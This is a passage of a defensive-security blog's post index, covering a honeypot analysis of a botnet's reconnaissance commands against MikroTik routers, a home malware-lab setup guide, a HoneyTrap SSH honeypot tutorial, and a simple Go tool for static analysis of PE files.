the expected output of echo Hi | cat -n.\n$echo Hi | cat -n 1 Hi Why would a robot want to print \u0026ldquo;Hi\u0026rdquo; to console? Let\u0026rsquo;s take a step back and look at the series of commands executed. The commands first search for information about the machine with ifconfig and uname. It looks for running processes with \u0026lsquo;miner\u0026rsquo; in their process name. It checks for specific files, all checks that will fail on the honeypot. After executing these commands, the unauthorized entity prints a greeting to standard out in an unusual manner.\nOne explaination is that after determining the machine is a honeypot the botnet leaves a mark to record it has identified the machine as a honeypot. The mark could be a flag to prevent the botnet from dropping their malware on research honeypots.\n Analysis Related Security Researcher Reports Similar behavior has been previously reported by security researcher @remco_verhoef. On June 13th 2018 Verhoef writes,\n \u0026ldquo;We\u0026rsquo;ve found interesting new traffic within our Honeytrap agents, originating from servers within Russia only (to be specific, the netblock owned by NKS / NCNET Broadband)\u0026hellip; they are executing all of the following ssh commands:\u0026quot;(SANS, 2018)\n /ip cloud print help ifconfig uname -a show ip cat /proc/cpuinfo uptime ls -la ls /data/data/com.android.providers.telephony/databases echo Hi | cat -n ps | grep '[Mm]iner' ps -ef | grep '[Mm]iner' In his post, Verhoef notes that since RouterOS v6.27 the /ip cloud print command has deprecated indicating that the targetted devices are those running software older than v6.27. Verhoef adds that because, \u0026ldquo;not all of the above commands are programmed to return the output expected by the script, it could be just probing for specifics about the attacked server,\u0026rdquo; (SANS, 2018).\nMikroTik \u0026amp; Coinhive Campaign Reports MikroTik is a router vender used Eastern Europe, based in Latvia. On May 23rd 2018, Cisco Talos reported that some MikroTik devices are vulnerable to VPNFilter malware, they warn routers were being compromised by Coinhive cryptocurrency malware. Talos identifies MikroTik RouterOS versions 1016, 1036, and 1072 for cloud core routers as vulnerable.\nTwo days later on May 25th, 2018 the FBI issued a public service announcement summarizing,\n \u0026ldquo;Foreign cyber actors have compromised hundreds of thousands of home and office routers and other networked devices worldwide. The actors used VPNFilter malware to target small office and home office routers. The malware is able to perform multiple functions, including possible information collection, device exploitation, and blocking network traffic.\u0026rdquo;\n Analyst Opinion The security event analyzed in this post has been executed numerous times by several IP addresses on the HoneyTrap server hosted in GCP. The botnet appears quite active, crawling the internet for RouterOS devices with a weak username and password configuration. The motive of these events has not been confirmed, however, as suggested by the FBI there are numerous malicious operations that could be conducted on a compromised router.\nLogged IP Addresses Remember, botnets may operate from compromised endpoints. This means the IPs listed below may not necessarily be the endpoint of the \u0026ldquo;real\u0026rdquo; attacking entity, but could instead potentially be zombified victim endpoints or VPN endpoints.\nThe event described in this post has been captured multiple times by the following addresses:\n51.222.139.65 174.124.123.109 185.110.91.235 The event described in this post is associated with the following hosts once:\n5.228.46.151 83.165.192.43 97.121.144.188 98.125.186.145 162.104.171.249 176.31.46.240 188.32.225.20 219.94.94.161 ","permalink":"https://malwaremily.com/posts/011-microtik/","summary":"Last Updated: 2021-02-04\nLast month, I wrote a post about setting up honeypots on GCP where I stood up a low-interaction SSH honeypot. Since then, I\u0026rsquo;ve been able to log a few megabytes worth of unauthorized behavior. This post will report on a repeated security event targeting misconfigured MikroTik routers.\n Event Behavior The attacker logs into the honeypot using admin/password and then sends the commands seen below into the honeypot terminal.","title":"A Botnet's Search for MikroTik Routers"},{"content":"This post is geared towards beginners and documents the general steps I took to build a home malware lab.\nMalware Lab Plans The malware lab must meet the following requirements:\n Malware environment must not connect to prod/shared networks. Dedicated physical workstation to host malware lab. (i.e. an old laptop) Quickly restore host in the event of malware escape. Include both static and dynamic analysis features.  WARNING: Conduct all security research on an isolated network seperate from shared/personal devices. Failure to contain malware could result in damage to other devices on the same network and/or loss of data.\nHardware Requriements I want to analyze malware samples in a secured environment so that in the event of malware escape I can wipe the host machine with no impact to my personal data. A small home malware lab using a spare labtop should be enough for my personal security research. I\u0026rsquo;ve created a seperate, isolated network for the lab, monitored by an IPS. I also have a USB device that I will be using to install an OS on the spare laptop. The laptop specs are dual-core i5 with 8 GB of RAM. The laptop RAM can be upgraded to 32 GB of RAM, I plan on upgrading it to 16 GB or 32 GB at a later date. VirtualBox needs 512 MB of RAM and ~30MB of disk space\u0026ndash; provided that I only use up to 7 GB of RAM, I should be okay to virtualize 2+ virtual machines (VMs) at a time.\nSoftware Requirements I am using Lubuntu, a lightweight version of Ubuntu, as the OS used to host the VMs. Lubuntu will allow me to allocate fewer resources to the OS than a regular Ubuntu so that I may allocate more resources to the VMs. The following technologies are installed:\n VirtualBox - to create virtual machines Vagrant - to manage virtual machines Docker - to create and manage containers  Singular Static \u0026amp; Dynamnic Analysis Machines For quick and easy forensic machines I use the REMnux Linux distribution. REMux is an Ubuntu 18.04 + GNOME base machine preloaded with forensic tools. Download the VirtualBox OVA from remnux.org. You can quickly launch this machine by double-clicking the ova file and configuring the imported machine. Once installed, login and update/upgrade. Then, change the network adapter to host-only in \u0026ldquo;Machine \u0026gt; Settings \u0026gt; Network\u0026rdquo;. Once the network has been isolated to the host, save a snapshot.\nsudo apt-get update sudo apt upgrade You can also install REMnux from source in your cloud forensic station:\nremnux install --mode cloud And/or you can run and install REMnux in a docker container:\ndocker run --rm -it -u remnux remnux/remnux-distro:focal bash REMnux provides many tools for static and dynamic analysis. If you\u0026rsquo;d like a full list check out the REMnux documentation. Generally, there are tools for PE and ELF files, Android files, static and dynamic analysis, network traffic analysis, deobfuscation tools, unpacking tools, etc. The REMnux machine can also then be reset and paired with a windows sandbox since it already has similated protocol tools for monitoring network behavior like fakenet, inetsim, and fakedns.\nWindows Sandbox Victim + Linux Machine Observer Modern malware checks its environment for signs its being observed. Using a sandboxed Windows environment allows us to execute malware and quietly observe the resulting changes to the environment. There are a couple of ways of going about this. We can grab a Windows development environment (~20GB) for testing from Microsoft. On this virtual machine we would then install tools (ProcessHacker, Process Monitor) to observe changes to the environment after the executable file is run. This machine would require at least 4 GB of RAM and 2 cores.\nThe REMnux machine can be used to observe the Windows sandbox. The virtual machines are both configured to share a virtual network isolated on the local host. The Windows machine is then set to point to the linux machine for networking services like DNS so that the linux machine captures relevent network data.\nAutomated Analysis with Third Parties We could also use a pre-built sandbox environment like cuckoo. Or if confidentiality is not an issue, you could upload the sample to VirusTotal, Hybrid Analysis, and/or Joes Sandbox.\n","permalink":"https://malwaremily.com/posts/007-building-malware-labs/","summary":"This post is geared towards beginners and documents the general steps I took to build a home malware lab.\nMalware Lab Plans The malware lab must meet the following requirements:\n Malware environment must not connect to prod/shared networks. Dedicated physical workstation to host malware lab. (i.e. an old laptop) Quickly restore host in the event of malware escape. Include both static and dynamic analysis features.  WARNING: Conduct all security research on an isolated network seperate from shared/personal devices.","title":"Malware Labs and Machines"},{"content":"Updated 2021-03-01: Give the reader a heads up that restarting SSH will kick them from their current session.\nOverview Honeypots are useful tools for collecting unauthorized interactions as logs. These logs can be digested to identify new attacking techniques or observe active username/password patterns. In the context of a security team, it could provide actionable information to pre-emptively secure the studied environment.\nThis tutorial will discuss general SSH honeypot pre-configuration, HoneyTrap installation, logging, and analysis. A docker continer is used to launch a low interaction SSH honeypot HoneyTrap. Check out the HoneyTrap documentation for more information about HoneyTrap and what HoneyTrap can do.\nPre-Configuration The honeypot workstation for this tutorial is GCP e2-micro instance running Ubuntu 16.04 LTS.\nSSH Service To log unauthorized interactions with the SSH service the default port 22 will be used by the fake honeypot service. The real SSH service will need to be moved to another port. For this tutorial port 1025 is used.\nFirst change the SSH service port number by editing sshd_config.\nsudo vim /etc/ssh/sshd_config Where the file reads\u0026hellip;\n# What ports, IPs, and protocols we listen for \u0026hellip;change Port 22 to Port 1025 and uncomment ListenAddress 0.0.0.0 and ListenAddress :: as shown below.\nPlease wait to restart the SSH service else you may lock yourself out.\nFirewall Changes Use ufw to open up the new port for the SSH service.\n$ sudo ufw allow 1025/tcp Rules updated Rules updated (v6) Restart the ssh service with sudo systemctl restart sshd. If you connected to this VM over SSH you\u0026rsquo;ll be kicked at this point.\nNow go to the GCP console and navigate to the firewall for the managed instance. In the firewall rule table, click on the name \u0026ldquo;default-allow-ssh\u0026rdquo; \u0026gt; Edit. Navigate to \u0026ldquo;Protocols and Ports\u0026rdquo; and change the specified port from 22 to the desired port number, we\u0026rsquo;ll use port 1025 for this example.\nNow add another rule for wild traffic on port 22. You should now be able to login from the custom port 1025 and honeypot traffic should be able to communicate out port 22.\nReturn to the honeypot instance. If you are SSH-ing in from the console, use the drop-down selector and choose \u0026ldquo;Open in browser window on custom port\u0026rdquo; to login using port 1025.\nInstall Docker Almost done with pre-configuration. Finally, install docker.\nHoneypot Installation At this point you should be able to install and run any functioning docker honeypot on port 22. We are using HoneyTrap for this tutorial because of ease of installation: you can pull the container and run it on port 22 with this command:\nsudo docker run -ditp 22:8022 honeytrap/honeytrap:latest Be sure to run the container in detached mode -d so that after you log out of the terminal session the container continues to run.\nYou can confirm the docker container is running with the command docker container ls:\n$ sudo docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 713be5f8fa05 honeytrap/honeytrap:latest \u0026quot;/honeytrap/honeytra…\u0026quot; 33 seconds ago Up 32 seconds 5900/tcp, 0.0.0.0:22-\u0026gt;8022/tcp happy_freebird Logs can be viewed by running sudo docker logs CONTAINER_NAME:\n$ sudo docker logs angry_chatterjee 2021/03/01 18:30:18 Using config file /config/config.toml _ _ _____ 🍯 | | | | ___ _ __ ___ _ |_ _| __ __ _ _ __ | |_| |/ _ \\| '_ \\ / _ \\ | | || || '__/ _' | '_ \\ | _ | (_) | | | | __/ |_| || || | | (_| | |_) | |_| |_|\\___/|_| |_|\\___|\\__, ||_||_| \\__,_| .__/ |___/ |_| Honeytrap starting... Version: DEVELOPMENT.GOGET (DEVELOPMENT.) Observing traffic Verify this honeypot is running by attempting to login from a remote client. As HoneyTrap runs on the GCP host, custom verbose debug logs are generated and printed to stdout. When an interaction is detected a log is created to record the behavior, otherwise periodically a heartbeat is logged to confirm to the operator the honeypot is alive and listening.\nPassword Guessing We can see an example of password gueesing in the log snippet below. IP 113.128.246.50 attempts to login to HoneyTrap over port 22 using the password adminbigdata:\nAfter successfully guessing or cracking the HoneyTrap login credentials (username=\u0026quot;root\u0026quot; password \u0026ldquo;password\u0026quot;) the attacker will see the following fake Ubuntu prompt.\nAny attempted commands appear in the logs character by character. An exit command would appear in the logs as:\nLogging Behaviors In another example, the value ssh.exec[] stores the movements of an attacker from source ip 71.214.59.235 sending exec commands over ssh (without logging in). They send 9 commands before realizing they are in a honeypot, at which point they say hello before disconnecting. Below you can see a screenshot of the logs storing ssh.exec[] values and then the entered commands in plaintext.\n/ip cloud print ifconfig uname -a cat /proc/cpuinfo ps | grep '[Mm]iner' ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/* echo Hi | cat -n Analysis To collect information from docker, output the logs to a text file and move the text file to another workstation for log ingestion and analysis.\nsudo docker logs CONTAINER_NAME \u0026gt; OUTPUTFILE.txt Script I made a script to parse the logs for some basic information including source-ip addresses, commands, and usernames/passwords attempted. Check out the gist here.\nFinal Thoughts Hosting honeypots on cloud architecture enables security researchers to quickly experiement without endangering local networks. It is not without its own considerations, the researcher should monitor and secure the research workstation and have a plan in the event of compromise. Open-source honeypots are commonly criticized for being easy to detect, evade, and come with security vulnerabilities of their own. In additon to making a plan for the honeypot lifecycle, make a plan for log collection and ingestion to automate log analysis and data visualization.\nAdditionally, the default username of the cloud machine will be the username of the gmail address used by GCP. A researcher using firstnameLastname@gmail[dot]com may allow an attacker to identify the first and last name of the researcher. This can be mitigated by adding a new user to the honeypot and removing the old firstnameLastname user. Usernames associated with social media account present similar concerns. Note also at the time of compute instance creation, the hostname set in the networking section defaults to HOSTNAME.REGION.PROJECT_NAME.internal where PROJECT_NAME and hosting region are exposed.\n","permalink":"https://malwaremily.com/posts/005-honeypots-cloud/","summary":"Updated 2021-03-01: Give the reader a heads up that restarting SSH will kick them from their current session.\nOverview Honeypots are useful tools for collecting unauthorized interactions as logs. These logs can be digested to identify new attacking techniques or observe active username/password patterns. In the context of a security team, it could provide actionable information to pre-emptively secure the studied environment.\nThis tutorial will discuss general SSH honeypot pre-configuration, HoneyTrap installation, logging, and analysis.","title":"HoneyTraps in the Cloud 101"},{"content":"Overview While reading Hands On System Programming with Go, I discovered the debug/pe package. To learn more about using Go I decided to spend a few days building a static forensic tool centered around use of this package. The debug/pe package provides functions that make analyzing a PE file easier. A glimpse of promising functions include: Open, ImportedLibraries, FileHeader, OpentionHeader32/64, and StringTable. Limiting myself to a span of a week, I\u0026rsquo;m reporting on functions I\u0026rsquo;ve applied to penut, a simple PE file static analysis tool, and what the next steps are to build upon the application.\nThe debug/pe Package Load PE file for analysis pe.Open() will load your executable and prep it for use as type *File. A File has the following struct:\ntype File struct { FileHeader OptionalHeader interface{} // of type *OptionalHeader32 or *OptionalHeader64; added in Go 1.3 Sections []*Section Symbols []*Symbol // COFF symbols with auxiliary symbol records removed; added in Go 1.1 COFFSymbols []COFFSymbol // all COFF symbols (including auxiliary symbol records); added in Go 1.8 StringTable StringTable // Go 1.8 // contains filtered or unexported fields } This is significant because it suggests that bare details of the executable are already available to the operator, ready to print to screen. Here is an example of pe.Open within the content of the application.\n\tpfile, err := pe.Open(os.Args[1]) if err != nil { fmt.Fprintf(os.Stderr, \u0026quot;pe.Open:%s\\n\u0026quot;, err) os.Exit(1) } defer pfile.Close() Sections As shown in the File struct above, we have access to Sections []*Section. This suggests we should be able to output some information related to PE sections. Sections are a basic unit of code or data within a Portable Executable (PE) or Common Object File Format (COFF) file. Section contents vary by section type; each section could occupied by a function or an object, and images make up multiple sections. Some sections serve special purposes, such as .idata, which stores all imported symbols.\nfunc printSections(f *pe.File) { fmt.Println(\u0026quot;Sections:\\n\u0026quot;) for _, s := range f.Sections { fmt.Printf(\u0026quot;%s\\n\u0026quot;, s.Name) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.VirtualSize, \u0026quot;Virtual Size\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.VirtualAddress, \u0026quot;Virtual Address\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.Size, \u0026quot;Size\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.Offset, \u0026quot;Offset\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.PointerToRelocations, \u0026quot;Pointer To Relocations\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.PointerToLineNumbers, \u0026quot;Pointer to Line Numbers\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.NumberOfRelocations, \u0026quot;Number of Relocations\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.NumberOfLineNumbers, \u0026quot;Number of Line Numbers\u0026quot;) fmt.Printf(\u0026quot;%0#8x %s\\n\u0026quot;, s.Characteristics, \u0026quot;Characteristics\u0026quot;) fmt.Println() } } The beautiful code in the snippet above was made avaliable by joesephspurrier. Here is a portion of the resulting output:\n$go run main.go main.exe Sections: .idata 0x000003fc Virtual Size 0x001fb000 Virtual Address 0x00000400 Size 0x001dd000 Offset 0x00000000 Pointer To Relocations 0x00000000 Pointer to Line Numbers 0x00000000 Number of Relocations 0x00000000 Number of Line Numbers 0xc0000040 Characteristics .reloc 0x0000d6a8 Virtual Size 0x001fc000 Virtual Address 0x0000d800 Size 0x001dd400 Offset 0x00000000 Pointer To Relocations 0x00000000 Pointer to Line Numbers 0x00000000 Number of Relocations 0x00000000 Number of Line Numbers 0x42000040 Characteristics Next Steps Right now, the main.go file must be modified to obtain any information, not much of it actionable. If I were to continue to work on penut I would like to output the results to a report and instead print a summary out after running penut. As I continued to experiment with the available types, structs, and functions provided by debug/pe I found that I would need to better famliarize myself with the Go language in order to digest and parse the information provided by the pe package.\nFile Header We can, for instance, pull File Header information from the new File instance pfile. The code below is an example of a function that would read in pfile and print out the File Header information.\nfunc printFileHeader(f *pe.File) { a := f.FileHeader fmt.Print(\u0026quot;File Header: \u0026quot;) fmt.Println(a) } And the resulting output:\n$go run main.go main.exe File Header: {332 15 0 2010112 3392 224 770} Looking at the above output of printFileHeader() we see the value of the pfile OptionalHeader interface{}. Microsoft Docs writes, \u0026ldquo;the PE file header consists of a Microsoft MS-DOS stub, the PE signature, the COFF file header, and an optional header. A COFF object file header consists of a COFF file header and an optional header.\u0026rdquo; The output of f.FileHeader consists of 7 values, inconsistent with the 4 values aforementioned (MS-DOS stub, PE signature, COEFF file header, optional header). So what are we seeing here? I\u0026rsquo;m not yet sure.\nString Table As another example, the StringTable attribute prints out what seems to be a LONG string of bytes.\nfunc printStringTable(f *pe.File) { a := f.StringTable fmt.Println(a) } This long string of bytes can be cast into a string for human reading.\nfunc printStringTable(f *pe.File) { a := string(f.StringTable) fmt.Println(a) } The long string appears to be deliniated by a period .. By itself, the data is not yet actionable, but you can look over the strings output a little easier by replacing the periods with newlines, as shown in the code and output below.\nfunc printStringTable(f *pe.File) { a := string(f.StringTable) b := strings.Replace(a, \u0026quot;.\u0026quot;, \u0026quot;\\n\u0026quot;, -1) fmt.Println(b) } [ \u0026hellip; ] Conclusion While penut is far from being a functional static analysis tool, it was fun to experiment with the Go debug/pe package for a few days. If you would like to see a working solution check out soluwalana\u0026rsquo;s go-pefile github repo.\n Thanks for reading! I hope you found the information educational. For even more information, see the following references:\n https://golang.org/pkg/debug/pe/ https://en.wikipedia.org/wiki/Portable_Executable https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#file-headers https://github.com/coffeefolia/penut  ","permalink":"https://malwaremily.com/posts/001-penut/","summary":"Overview While reading Hands On System Programming with Go, I discovered the debug/pe package. To learn more about using Go I decided to spend a few days building a static forensic tool centered around use of this package. The debug/pe package provides functions that make analyzing a PE file easier. A glimpse of promising functions include: Open, ImportedLibraries, FileHeader, OpentionHeader32/64, and StringTable. Limiting myself to a span of a week, I\u0026rsquo;m reporting on functions I\u0026rsquo;ve applied to penut, a simple PE file static analysis tool, and what the next steps are to build upon the application.","title":"Writing my first forensic tool in Go"},{"content":"Hi! My name is malwaremily. I write about DFIR, GRC, and defensive security topics. I love documenting what I learn so that I may share it with others. I also enjoy a strong london fog tea and tending to my tropical freshwater aquariums.\n","permalink":"https://malwaremily.com/about/","summary":"Hi! My name is malwaremily. I write about DFIR, GRC, and defensive security topics. I love documenting what I learn so that I may share it with others. I also enjoy a strong london fog tea and tending to my tropical freshwater aquariums.","title":"About"},{"content":"","permalink":"https://malwaremily.com/archives/","summary":"archives","title":"Archive"},{"content":"","permalink":"https://malwaremily.com/search/","summary":"search","title":"Search"}]